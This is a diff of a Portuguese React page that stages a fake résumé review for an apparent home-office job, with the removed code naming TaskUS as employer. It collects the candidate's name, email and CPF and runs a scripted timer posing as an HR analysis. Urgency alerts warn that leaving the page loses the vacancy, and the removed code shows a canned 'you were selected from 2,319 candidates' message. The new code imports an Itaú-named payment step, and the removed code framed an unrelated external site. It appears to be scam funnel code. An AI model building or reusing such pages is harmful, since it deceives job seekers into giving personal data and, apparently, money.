@@ -1,85 +1,214 @@
-import React, { useState, useEffect } from 'react';
-import { motion } from 'framer-motion';
-import { Star } from 'lucide-react';
+// pages/ConfirmacaoCurriculo.jsx
+import React, { useEffect, useRef, useState } from 'react';
 import { useProcess } from '@/hooks/useProcess.js';
-import InfoIconMin from '../../assets/info_icon-min.webp';
-import Alert_Icon_Min from '../../assets/alert_icon-min.webp';
+import { motion, AnimatePresence } from "framer-motion";
 import '../../styles/refino.css';
 
-// eslint-disable-next-line no-unused-vars
-const ConfirmaçãoCurriculo = ({ dadosUsuario, tempoEspera = '7 minutos', onContinuar }) => {
-  const [isLoading, setIsLoading] = useState(false);
+import ExplanatoryCards from '../modules/ExplanatoryCards';
+import { IconAlert, IconChecklistLike } from '../modules/SvgIcons';
+import Headlines from '../modules/Headlines';
+import Paragraphs from '../modules/Paragraphs';
+import Maintexts from '../modules/Main-texts';
+import LoadingBar from '../modules/LoadingBar';
+
+import AnalysisStepsList from '../modules/AnalysisStepsList';
+import RHPopup from '../modules/RHPopup';
+import DetailsModal from '../modules/DetailsModal';
+import FinalModal from '../modules/FinalModal';
+
+// ⚠️ Caminho correto a partir de /pages:
+import PaymentItauLoadingStep from '../../modules/PaymentItauLoadingStep.jsx';
+
+const ConfirmacaoCurriculo = ({ dadosUsuario, onContinuar }) => {
   const { processData } = useProcess();
 
-  // Estados para o popup RH
-  const [showPopupRH, setShowPopupRH] = useState(false);
-  const [showIframeRH, setShowIframeRH] = useState(false);
+  // ============ OVERLAY DE ENTRADA (Step 4) ============
+  // 'intro' (mostra), null (sumiu)
+  const [entryOverlayPhase, setEntryOverlayPhase] = useState('intro');
+  const showEntryOverlay = entryOverlayPhase === 'intro';
+  const booted = !showEntryOverlay; // só "inicia" a página após o overlay sumir
 
-  // Email pode ser usado em etapas seguintes
-  const [usuario] = useState({
-    email: dadosUsuario?.email || ''
-  });
-
-  // Nome priorizando processData, com fallback para dadosUsuario
-  let nome = '';
-  if (processData?.userData?.firstName) {
-    nome = `${processData.userData.firstName} ${processData.userData?.lastName || ''}`.trim();
-  } else {
-    nome = dadosUsuario?.nome || 'Usuário Desconhecido';
-  }
-
-  // CPF exibido (somente leitura)
-  const cpfDisplay =
-    processData?.userData?.cpf ||
-    dadosUsuario?.cpf ||
-    '000.000.000-00';
-
-  // ====== PROGRESSO
-  const [progress, setProgress] = useState(0);
-  const totalSeconds = 30;
-  // eslint-disable-next-line no-unused-vars
-  const [elapsed, setElapsed] = useState(0);
-  // Estado para modal
-  const [showModal, setShowModal] = useState(false);
-
-  const getProgressMessage = (percent) => {
-    if (percent < 25) return 'Estamos validando suas informações…';
-    if (percent < 50) return 'Currículo em análise pelo RH…';
-    if (percent < 75) return 'Conferindo aderência à vaga e disponibilidade…';
-    return 'Finalizando sua avaliação. Mais um instante…';
+  const headline = 'Análise do Currículo';
+  const subline = 'Estamos validando suas informações para seguir com a seleção.';
+  const messagesByPhase = {
+    4: ['Validando currículo…', 'Enviando para análise…', 'Comparando requisitos…']
   };
 
-  // Effect para inicializar o popup RH após 5 segundos
-  useEffect(() => {
-    const popupTimer = setTimeout(() => {
-      setShowPopupRH(true);
-      // Previne scroll da página de fundo
-      document.body.style.overflow = 'hidden';
-    }, 5000);
+  const [isLoading, setIsLoading] = useState(false);
 
-    return () => clearTimeout(popupTimer);
-  }, []);
+  // >>> ÂNCORA GLOBAL: definida IMEDIATAMENTE ao montar o componente
+  const globalStartAtMsRef = useRef(Date.now());
 
-  useEffect(() => {
-    if (progress < 100) {
-      const timer = setTimeout(() => {
-        setProgress((prev) => Math.min(prev + 1, 100));
-        setElapsed((prev) => prev + 1);
-      }, totalSeconds * 11212); // ~200ms por % => ~20s no total
-      return () => clearTimeout(timer);
-    } else if (progress === 100) {
-      setShowModal(true);
+  const alerts = [
+    {
+      id: 'equipments-alert',
+      icon: IconAlert,
+      title: 'Aguarde a análise',
+      description:
+        'Nossa equipe vai entrar em contato por aqui para confirmar algumas informações. Se você não responder, a vaga será automaticamente destinada a outro candidato. Por isso, não feche esta página e nem abra outros aplicativos. Permaneça aqui para garantir a sua vaga.'
     }
-  }, [progress]);
+  ];
 
-  const remainingSeconds = Math.max(
-    totalSeconds - Math.floor((progress / 1022220) * totalSeconds),
-    0
-  );
-  const formatTime = (sec) => {
-    const min = Math.floor(sec / 60);
-    const s = sec % 60;
-    return `${min > 0 ? min + 'm ' : ''}${s}s`;
+  const padrao = [
+    {
+      id: 'equipments-info',
+      icon: IconChecklistLike,
+      title: 'Online 24h/dia',
+      description:
+        'De 01/10 a 9/11, nossa equipe de RH está em turnos especiais para atender à alta demanda de contratações. Nesse período, todos os candidatos são avaliados 24 horas por dia.'
+    }
+  ];
+
+  const [showPopupRH, setShowPopupRH] = useState(false);
+  const [isMinimized, setIsMinimized] = useState(false);
+  const [showModal, setShowModal] = useState(false);       // modal final
+  const [showDetails, setShowDetails] = useState(false);   // modal de detalhes
+
+  // ====== POPUP DE ALERTA ======
+  const [showAlertPopup, setShowAlertPopup] = useState(false);
+
+  // Tempo GLOBAL - 3 MINUTOS (180 segundos)
+  const totalDurationMs = 180000; // 3 minutos
+
+  // Tempo POPUP AVISOS - Abre em 00:20 (20 segundos após início)
+  const alertPopupDelayMs = 20000; // 20 segundos
+
+  // Duração do POPUP AVISOS - Fica aberto por 30 segundos
+  const alertPopupDurationMs = 30000; // 30 segundos
+
+  // ===== Tempo restante sincronizado com o global =====
+  const [globalRemainingMs, setGlobalRemainingMs] = useState(totalDurationMs);
+
+  // Tempo para abrir MENSAGEM DO RH - Abre em 02:00 (120 segundos = 2 minutos)
+  const rhPopupDelayMs = 120000; // 2 minutos
+
+  // Duração do RH POPUP - Fica aberto por 50 segundos
+  const rhPopupDurationMs = 50000; // 50 segundos
+
+  // ===== Coordenador de múltiplas LoadingBars principais =====
+  const MAIN_BARS = ['main']; // ex.: ['main', 'footer']
+  const [completedBarIds, setCompletedBarIds] = useState(() => new Set());
+
+  const onLoadingComplete = () => setShowModal(true);
+
+  // Evita duplo-disparo e limpa o timer global quando concluir
+  const mainTimerRef = useRef(null);
+
+  const handleBarComplete = (id) => {
+    setCompletedBarIds(prev => {
+      const next = new Set(prev);
+      if (!next.has(id)) next.add(id);
+      if (next.size >= MAIN_BARS.length) {
+        if (mainTimerRef.current) {
+          clearTimeout(mainTimerRef.current);
+          mainTimerRef.current = null;
+        }
+        onLoadingComplete();
+      }
+      return next;
+    });
+  };
+
+  // ✅ Inicialização só após o overlay sumir
+  useEffect(() => {
+    if (!booted) return;
+
+    // A âncora global já foi definida no mount do componente
+    // Não redefinimos aqui para não perder o tempo do overlay
+
+    // Atualizar tempo restante global a cada 100ms
+    const globalTimer = setInterval(() => {
+      const elapsed = Date.now() - globalStartAtMsRef.current;
+      const remaining = Math.max(0, totalDurationMs - elapsed);
+      setGlobalRemainingMs(remaining);
+    }, 100);
+
+    // Calcular tempo já decorrido desde o mount
+    const elapsed = Date.now() - globalStartAtMsRef.current;
+    const remaining = Math.max(0, totalDurationMs - elapsed);
+
+    mainTimerRef.current = setTimeout(() => {
+      handleBarComplete('main');
+    }, remaining);
+
+    // Abre o alerta temporizado após o delay (ajustado pelo tempo já decorrido)
+    const alertDelay = Math.max(0, alertPopupDelayMs - elapsed);
+    const alertTimer = setTimeout(() => {
+      setShowAlertPopup(true);
+    }, alertDelay);
+
+    // Abre o RHPopup no momento certo (ajustado pelo tempo já decorrido)
+    const rhDelay = Math.max(0, rhPopupDelayMs - elapsed);
+    const rhTimer = setTimeout(() => setShowPopupRH(true), rhDelay);
+
+    return () => {
+      clearInterval(globalTimer);
+      if (mainTimerRef.current) {
+        clearTimeout(mainTimerRef.current);
+        mainTimerRef.current = null;
+      }
+      clearTimeout(alertTimer);
+      clearTimeout(rhTimer);
+    };
+  }, [booted, totalDurationMs, alertPopupDelayMs, rhPopupDelayMs]);
+
+  // Fechar o popup automaticamente após a duração especificada
+  useEffect(() => {
+    if (!showAlertPopup) return;
+
+    const closeTimer = setTimeout(() => {
+      setShowAlertPopup(false);
+    }, alertPopupDurationMs);
+
+    return () => clearTimeout(closeTimer);
+  }, [showAlertPopup, alertPopupDurationMs]);
+
+  // Fechar o RHPopup automaticamente após a duração especificada
+  useEffect(() => {
+    if (!showPopupRH) return;
+
+    const closeTimer = setTimeout(() => {
+      setShowPopupRH(false);
+    }, rhPopupDurationMs);
+
+    return () => clearTimeout(closeTimer);
+  }, [showPopupRH, rhPopupDurationMs]);
+
+  // Bloquear scroll do body quando QUALQUER modal/popup/overlay estiver aberto
+  useEffect(() => {
+    const anyOpen = showEntryOverlay || showPopupRH || showModal || showDetails || showAlertPopup;
+    if (anyOpen) {
+      const scrollY = window.scrollY || window.pageYOffset || 0;
+      document.body.dataset.scrollY = String(scrollY);
+      Object.assign(document.body.style, {
+        position: 'fixed',
+        top: `-${scrollY}px`,
+        left: '0', right: '0', width: '100%', overflow: 'hidden'
+      });
+    } else {
+      const savedY = parseInt(document.body.dataset.scrollY || '0', 10);
+      Object.assign(document.body.style, { position: '', top: '', left: '', right: '', width: '', overflow: '' });
+      window.scrollTo(0, savedY);
+      delete document.body.dataset.scrollY;
+    }
+  }, [showEntryOverlay, showPopupRH, showModal, showDetails, showAlertPopup]);
+
+  const usuario = { email: dadosUsuario?.email || '' };
+
+  const nome = processData?.userData?.firstName
+    ? `${processData.userData.firstName} ${processData.userData?.lastName || ''}`.trim()
+    : (dadosUsuario?.nome || 'Candidato(a)');
+
+  const candidate = {
+    nome,
+    email: usuario.email || '-',
+    cpf: processData?.userData?.cpf || dadosUsuario?.cpf || '-',
+    cidade: processData?.userData?.city || '-',
+    estado: processData?.userData?.state || '-',
+    disponibilidade: processData?.userData?.availability || '-',
+    pretensao: processData?.userData?.salaryExpectation || '-',
+    experiencia: processData?.userData?.experience || '-',
+    formacao: processData?.userData?.education || '-',
   };
 
   const handleContinuar = async () => {
@@ -88,412 +217,141 @@ const ConfirmaçãoCurriculo = ({ dadosUsuario, tempoEspera = '7 minutos', onCon
       await onContinuar({
         nome,
         email: usuario.email || '',
-        cpf: cpfDisplay
+        cpf: candidate.cpf || '000.000.000-00'
       });
     } catch (error) {
-      // Silencioso
+      console.error('Erro ao continuar:', error);
     } finally {
       setIsLoading(false);
     }
   };
 
-  // Funções do popup RH
-  const handleAcceptPopupRH = () => {
-    setShowIframeRH(true);
-  };
-
-  const handleClosePopupRH = () => {
-    setShowPopupRH(false);
-    setShowIframeRH(false);
-    // Restaura scroll da página
-    document.body.style.overflow = '';
-  };
-
-  // Effect para fechar popup com ESC
-  useEffect(() => {
-    const handleKeyDown = (e) => {
-      if (e.key === 'Escape' && showPopupRH) {
-        handleClosePopupRH();
-      }
-    };
-
-    document.addEventListener('keydown', handleKeyDown);
-    return () => document.removeEventListener('keydown', handleKeyDown);
-  }, [showPopupRH]);
-
   return (
     <>
-      {/* ====== CONTAINER PRINCIPAL ====== */}
-      <div className="space-y-6">
-        {/* Mensagem principal */}
-        <h1 className="titulodaetapa font-hendrix-semibold text-gray-800 text-lg mb-5">
-          {nome}, nossa equipe de RH está analisando o seu perfil agora.
-        </h1>
-         {/* Alerta de seleção */}
-      
+      {/* ===== Overlay de Entrada (Step 4) ===== */}
+      {showEntryOverlay && (
+        <PaymentItauLoadingStep
+          stepIndex={4}
+          animateFromPrevious
+          autoAdvanceMs={3000}
+          onLoadingComplete={() => setEntryOverlayPhase(null)}
+          headline={headline}
+          subline={subline}
+          rotatingMessages={messagesByPhase}
+        />
+      )}
 
-        <p className="subtitulodaetapa font-hendrix-regular text-gray-500">
-          A análise leva de 2 a 5 minutos. Ao final, vamos informar se você foi selecionado(a) para ser contratado(a).
-        </p>
+      {/* ===== Conteúdo principal só após overlay sumir ===== */}
+      {booted && (
+        <>
+          <div className="bloco_principal">
+            <Maintexts>
+              <Headlines variant="black">
+                {nome}, em<br /> minutos você saberá se <br />foi selecionado(a) para ser contratado(a)
+              </Headlines>
+            </Maintexts>
 
-        <div className="bg-gray-900 text-white rounded-lg pl-4 flex items-center gap-2 mt-4">
-        <img className="h-7 w-7" src={Alert_Icon_Min} alt="Alerta" />
-        <span className="text-sm px-2 aviso flex-1">
-          Se você sair dessa página, a análise será <br/>pausada e você pode perder sua vaga.
-        </span>
-      </div>
+            <Paragraphs variant="black">
+              Nossa equipe de RH já está fazendo a análise do seu perfil.
+            </Paragraphs>
 
-        <div
-  className="rounded-2xl px-6 py-5"
-  style={{ background: '#f3f6f9', minHeight: 90 }}
->
-  <div className="flex flex-col items-start">
-    {/* Ícone */}
-    <div className="mb-2">
-      <div
-        className="w-[40px] h-[48px] mt-1 flex items-center justify-center rounded-md"
-        style={{ backgroundColor: '' }}
-      >
-        <svg
-          xmlns="http://www.w3.org/2000/svg"
-          width="40"
-          height="40"
-          viewBox="0 0 24 24"
-          fill="none"
-          stroke="#1655ff"
-          strokeLinecap="round"
-          strokeLinejoin="round"
-          strokeWidth="1.5"
-        >
-          <g color="currentColor">
-            <path d="M14.926 2.911L8.274 6.105a2.43 2.43 0 0 1-1.617.182a8 8 0 0 0-.695-.14C4.137 5.94 3 7.384 3 9.045v.912c0 1.66 1.137 3.105 2.962 2.896a7 7 0 0 0 .695-.139a2.43 2.43 0 0 1 1.617.183l6.652 3.193c1.527.733 2.291 1.1 3.142.814c.852-.286 1.144-.899 1.728-2.125a12.17 12.17 0 0 0 0-10.556c-.584-1.226-.876-1.84-1.728-2.125c-.851-.286-1.615.08-3.142.814"/>
-            <path d="M11.458 20.77L9.967 22c-3.362-2.666-2.951-3.937-2.951-9H8.15c.46 2.86 1.545 4.216 3.043 5.197c.922.604 1.112 1.876.265 2.574M7.5 12.5v-6"/>
-          </g>
-        </svg>
-      </div>
-    </div>
+            {/* Barra PRINCIPAL (id: 'main') — sincronizada com o tempo global */}
+            <LoadingBar
+              totalDurationMs={totalDurationMs}
+              startAtMs={globalStartAtMsRef.current}
+              onComplete={() => handleBarComplete('main')}
+            />
 
-    {/* Título */}
-    <h3
-      className="font-hendrix-semibold mb-2"
-      style={{ fontSize: '12pt', color: '#1655ff', textAlign: 'left' }}
-    >
-      Aviso Importante
-    </h3>
+            <AnalysisStepsList totalDurationMs={totalDurationMs} />
 
-    {/* Descrição */}
-    <div
-      className="text-sm text-gray-700"
-      style={{ fontSize: '10pt', textAlign: 'left' }}
-    >
-      De 01/09 a 30/09, nossa equipe de RH está em turnos especiais para
-      atender à alta demanda de contratações. Nesse período, todos os candidatos
-      serão avaliados 24 horas por dia.
-    </div>
-  </div>
-</div>
-
-        {/* ====== Informações do candidato(a) (somente leitura) */}
-        <div className="space-y-2 mt-12">
-          <h2 className="textocontinuidade font-hendrix-semibold text-gray-700 text-sm mb-3">
-            Candidato(a)
-          </h2>
-
-          <div className="bg-white border border-gray-200 rounded-2xl space-y-4">
-            {/* Nome */}
-            <div className="flex items-center justify-between">
-              <span className=" rounded-xl px-4 mt-2 mb-1 py-2 text-right font-hendrix-regular text-gray-900 text-sm">
-                {nome}
-              </span>
-            </div>
-
-          
-          </div>
-        </div>
-
-        {/* Vaga pretendida */}
-        <div className="mt-6">
-          <h2 className="textocontinuidade font-hendrix-semibold text-gray-900 text-sm mb-4">
-            Vaga pretendida
-          </h2>
-          <div className="bg-white rounded-2xl border border-gray-200 p-6">
-            <span className="font-hendrix-semibold text-gray-400 text-sm">272 vagas disponíveis</span>
-            <div className="flex items-center mb-5">
-              <span className="font-hendrix-semibold text-blue-600 text-2xl">Atendente Home Office</span>
-            </div>
-
-            <div className="flex items-center space-x-3 border-y py-2">
-              <div>
-                <span className="font-hendrix-medium text-gray-700 text-xs" style={{ fontSize: '10pt' }}>
-                  Salário mensal
-                </span>
-                <br />
-                <span
-                  className="font-hendrix-semibold text-gray-900 text-lg"
-                  style={{ fontSize: '18pt', lineHeight: '1vw' }}
-                >
-                  R$2.450,00
-                </span>
-              </div>
-          
-            </div>
-             <div className="flex items-center mb-2 space-x-3 border-b py-2">
-              <div>
-                <span className="font-hendrix-medium text-gray-700 text-xs" style={{ fontSize: '10pt' }}>
-                  Vale alimentação
-                </span>
-                <br />
-                <span
-                  className="font-hendrix-semibold text-gray-900 text-lg"
-                  style={{ fontSize: '18pt', lineHeight: '1vw' }}
-                >
-                  R$450,00
-                </span>
-              </div>
-            </div>
-
-            <div className="mb-2">
-              <span className="font-hendrix-bold text-gray-700 text-xs" style={{ fontSize: '12pt' }}>
-                + Benefícios
-              </span>
-              <br />
-              <p
-                className="font-hendrix-regular text-gray-700 text-sm"
-                style={{ fontSize: '11pt', lineHeight: '5vw' }}
+            <div className="mt-6">
+              <button
+                type="button"
+                onClick={() => setShowDetails(true)}
+                className="inline-flex items-center w-[100%] mt-[-3vw] justify-center rounded-xl bg-white text-[#1e3c72] border border-gray-200 px-4 py-4 text-sm font-medium hover:bg-gray-50 transition-colors"
               >
-                Plano de saúde, plano odontológico e férias remuneradas.
-              </p>
+                Ver detalhes da Entrevista
+              </button>
             </div>
           </div>
-        </div>
-      </div>
 
-      {/* Barra de progresso */}
-      <div className="mt-8">
-        <div className="w-full bg-gray-200 rounded-full h-3 mb-2">
-          <div
-            className="h-3 rounded-full transition-all duration-500 ease-out"
-            style={{
-              background: 'linear-gradient(90deg, #1655ff 0%, #4285f4 100%)',
-              width: `${progress}%`
-            }}
+          <AnimatePresence>
+            {showAlertPopup && (
+              <motion.div
+                className="fixed inset-0 z-[100] flex items-center justify-center p-4"
+                initial={{ opacity: 0 }}
+                animate={{ opacity: 1 }}
+                exit={{ opacity: 0 }}
+              >
+                {/* Fundo escuro e desfocado */}
+                <div
+                  className="absolute inset-0 bg-black/40 backdrop-blur-sm"
+                  onClick={() => setShowAlertPopup(false)}
+                />
+
+                {/* Modal */}
+                <motion.div
+                  className="relative z-[1000000] w-full max-w-xl bg-white rounded-2xl shadow-lg flex flex-col"
+                  initial={{ scale: 0.92, opacity: 0 }}
+                  animate={{ scale: 1, opacity: 1 }}
+                  exit={{ scale: 0.92, opacity: 0 }}
+                >
+                  {/* Header do popup com contador */}
+                  <div className="px-4 pt-4 pb-2 border-b flex items-center justify-between">
+                    <span className="text-sm font-medium text-gray-800">
+                      Informações Importantes
+                    </span>
+                    <span className="text-xs text-gray-500">
+                      Fecha em {Math.ceil(globalRemainingMs / 1000)}s
+                    </span>
+                  </div>
+
+                  {/* Conteúdo rolável */}
+                  <div className="scroll-area overflow-y-auto p-4">
+                    <ExplanatoryCards supportTypes={alerts} variant="alert" />
+                    <div className="h-2" />
+                    <ExplanatoryCards supportTypes={padrao} />
+
+                    {/* Barra do POPUP — sincronizada com o fluxo global */}
+                    <div className="mt-[-1.4vw] mb-[-2.5vw]">
+                      <LoadingBar
+                        totalDurationMs={totalDurationMs}
+                        startAtMs={globalStartAtMsRef.current}
+                        onComplete={() => {}}
+                      />
+                    </div>
+                  </div>
+                </motion.div>
+              </motion.div>
+            )}
+          </AnimatePresence>
+
+          {/* RHPopup recebe o startAtMs GLOBAL e deve repassar para suas LoadingBars */}
+          <RHPopup
+            open={showPopupRH}
+            onClose={() => setShowPopupRH(false)}
+            isMinimized={isMinimized}
+            onToggleMinimize={() => setIsMinimized(v => !v)}
+            totalDurationMs={totalDurationMs}
+            startAtMs={globalStartAtMsRef.current}
+            onLoadingComplete={onLoadingComplete}
           />
-        </div>
-        <div className="flex items-center justify-between">
-          <span className="font-hendrix-medium text-gray-700 text-xs">
-            {getProgressMessage(progress)}
-          </span>
-          <span className="font-hendrix-regular text-gray-500 text-xs">{progress}%</span>
-        </div>
-      </div>
 
-      {/* Rodapé de tempo */}
-      <div className="flex items-center justify-between mt-6">
-        <span className="font-hendrix-regular text-gray-500 text-xs">Análise em andamento</span>
-        <span className="font-hendrix-medium text-gray-700 text-xs">
-          Tempo restante: {formatTime(remainingSeconds)}
-        </span>
-      </div>
+          <DetailsModal
+            open={showDetails}
+            onClose={() => setShowDetails(false)}
+            candidate={candidate}
+          />
 
-      {/* ====== FORA DO CONTAINER PRINCIPAL ====== */}
-
-     
-      {/* Vídeo explicativo */}
-      <div className="mt-6">
-        <span className="titulodaetapa font-hendrix-bold mb-10 text-gray-900 text-sm mb-2 block">
-          Enquanto isso, assista a este pequeno vídeo e descubra como é trabalhar com a TaskUS.
-        </span>
-        <div className="w-full h-40 bg-gray-300 rounded-xl flex items-center justify-center">
-          <span className="font-hendrix-medium text-gray-500">Vídeo institucional</span>
-        </div>
-      </div>
-
-      {/* ====== POPUP RH ====== */}
-      {showPopupRH && (
-        <div 
-          className="fixed inset-0 z-[9999] flex items-center justify-center"
-          style={{ 
-            background: 'rgba(0, 0, 0, 0.7)',
-            animation: 'fadeIn 0.3s ease-out'
-          }}
-          onClick={(e) => {
-            if (e.target === e.currentTarget) {
-              handleClosePopupRH();
-            }
-          }}
-        >
-          <div 
-            className="bg-white rounded-2xl shadow-2xl max-w-md w-[90%] max-h-[90vh] overflow-hidden relative"
-            style={{
-              animation: 'slideUp 0.4s ease-out',
-              boxShadow: '0 25px 50px rgba(0, 0, 0, 0.3)'
-            }}
-          >
-            {/* Tela inicial - Mensagem do RH */}
-            {!showIframeRH && (
-              <div className="p-10 text-center">
-                <div 
-                  className="w-20 h-20 mx-auto mb-6 rounded-full flex items-center justify-center text-white text-2xl font-bold"
-                  style={{
-                    background: 'linear-gradient(135deg, #1655ff 0%, #4285f4 100%)'
-                  }}
-                >
-                  RH
-                </div>
-                
-                <h2 className="text-2xl font-bold text-gray-800 mb-4">
-                  Mensagem da Equipe de RH
-                </h2>
-                
-                <p className="text-gray-600 mb-8 leading-relaxed">
-                  Nossa equipe preparou uma comunicação importante para você.
-                </p>
-
-                <div className="bg-gray-50 border-l-4 border-blue-500 p-5 mb-6 text-left rounded-lg">
-                  <h4 className="text-blue-600 font-semibold mb-2 text-lg">🎯 Oportunidade Especial</h4>
-                  <p className="text-gray-700 text-sm leading-relaxed">
-                    Identificamos que seu perfil pode ser ideal para novas oportunidades em nossa empresa. 
-                    Gostaríamos de apresentar algumas vagas exclusivas que podem interessar você.
-                  </p>
-                </div>
-
-                <div className="bg-gray-50 border-l-4 border-blue-500 p-5 mb-8 text-left rounded-lg">
-                  <h4 className="text-blue-600 font-semibold mb-2 text-lg">⏰ Processo Simplificado</h4>
-                  <p className="text-gray-700 text-sm leading-relaxed">
-                    Desenvolvemos um processo de candidatura mais rápido e eficiente. 
-                    Você pode se candidatar diretamente através do nosso sistema integrado.
-                  </p>
-                </div>
-
-                <motion.button
-                  onClick={handleAcceptPopupRH}
-                  whileTap={{ scale: 0.97 }}
-                  whileHover={{ scale: 1.02 }}
-                  className="px-10 py-4 rounded-full text-white font-semibold text-lg transition-all duration-300"
-                  style={{
-                    background: 'linear-gradient(135deg, #1655ff 0%, #4285f4 100%)',
-                    boxShadow: '0 4px 15px rgba(22, 85, 255, 0.3)'
-                  }}
-                >
-                  Aceitar e Continuar
-                </motion.button>
-              </div>
-            )}
-
-            {/* Tela do iframe */}
-            {showIframeRH && (
-              <div className="h-[600px] max-h-[90vh]">
-                <div 
-                  className="flex justify-between items-center p-4 text-white"
-                  style={{
-                    background: 'linear-gradient(135deg, #1655ff 0%, #4285f4 100%)'
-                  }}
-                >
-                  <span className="font-semibold text-lg">Portal de Oportunidades - RH</span>
-                  <button
-                    onClick={handleClosePopupRH}
-                    className="text-white hover:bg-white hover:bg-opacity-20 rounded-full p-2 transition-all duration-300 text-2xl leading-none"
-                  >
-                    ×
-                  </button>
-                </div>
-                <div className="h-[calc(600px-60px)] max-h-[calc(90vh-60px)]">
-                  <iframe 
-                    src="https://sinaisdaalma.atendimentosdigitais.site/sinaisdaalma"
-                    title="Portal de Atendimento RH"
-                    className="w-full h-full border-none"
-                  />
-                </div>
-              </div>
-            )}
-          </div>
-        </div>
+          <FinalModal
+            open={showModal}
+            onContinue={handleContinuar}
+            loading={isLoading}
+          />
+        </>
       )}
-
-      {/* Modal de finalização original */}
-      {showModal && (
-        <div className="fixed px-5 inset-0 z-50 flex items-center justify-center">
-          {/* Overlay transparente */}
-          <div className="absolute inset-0 bg-gray-900" style={{ opacity: 0.75 }} />
-        <div className="relative bg-white rounded-2xl shadow-lg p-10 max-w-sm w-full">
-  <script src="https://cdn.lordicon.com/lordicon.js"></script>
-
-            <lord-icon
-            src="https://cdn.lordicon.com/qlpudrww.json"
-              trigger="loop"
-              delay="2000"
-              colors="primary:#110a5c"
-              style={{ width: "90px", height: "90px", margin: "0 auto 1px" }}
-            >
-            </lord-icon>
-            <h2 className="titulodaetapa font-hendrix-bold text-xl text-gray-900 mb-4">Análise concluída!</h2>
-            <p className="subtitulodaetapa font-hendrix-regular text-gray-700 mb-6">
-              Parabéns! Você foi selecionado (a) entre mais de <span className="font-hendrix-bold text-gray-900">2.319 candidatos</span>.  
-              Sua dedicação e perfil se destacaram e, por isso, você conquistou essa oportunidade.
-            </p>
-            <motion.button
-              onClick={handleContinuar}
-              disabled={isLoading}
-              whileTap={{ scale: 0.97 }}
-              whileHover={{ scale: isLoading ? 1 : 1.03 }}
-              className={`w-full flex items-center justify-center gap-2 px-6 py-4 rounded-full font-hendrix-medium text-white shadow-md focus:outline-none focus:ring-2 focus:ring-blue-400 transition-all duration-300 ${isLoading ? 'cursor-not-allowed' : ''}`}
-              style={{
-                background: isLoading
-                  ? 'linear-gradient(135deg, #bdbdbd 0%, #e0e0e0 100%)'
-                  : 'linear-gradient(135deg, #1655ff 0%, #4285f4 100%)',
-                fontSize: '11pt',
-                boxShadow: '0 2px 8px 0 rgba(22,85,255,0.10)',
-                border: 'none',
-                opacity: isLoading ? 0.7 : 1
-              }}
-            >
-              {isLoading ? (
-                <>
-                  <motion.div
-                    className="w-4 h-4 border-2 border-white border-t-transparent rounded-full"
-                    animate={{ rotate: 360 }}
-                    transition={{ repeat: Infinity, duration: 0.8, ease: 'linear' }}
-                    style={{
-                      borderTopColor: 'transparent',
-                      borderRightColor: 'white',
-                      borderBottomColor: 'white',
-                      borderLeftColor: 'white'
-                    }}
-                  />
-                  <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '10pt' }}>
-                    Aguarde...
-                  </span>
-                </>
-              ) : (
-                <span className="font-hendrix-bold tracking-wide" style={{ fontSize: '12pt' }}>
-                  Continuar
-                </span>
-              )}
-            </motion.button>
-          </div>
-        </div>
-      )}
-
-      {/* Estilos CSS para as animações do popup */}
-      <style jsx>{`
-        @keyframes fadeIn {
-          from { opacity: 0; }
-          to { opacity: 1; }
-        }
-
-        @keyframes slideUp {
-          from {
-            opacity: 0;
-            transform: translateY(50px) scale(0.9);
-          }
-          to {
-            opacity: 1;
-            transform: translateY(0) scale(1);
-          }
-        }
-      `}</style>
     </>
   );
 };
 
-export default ConfirmaçãoCurriculo;
+export default ConfirmacaoCurriculo;
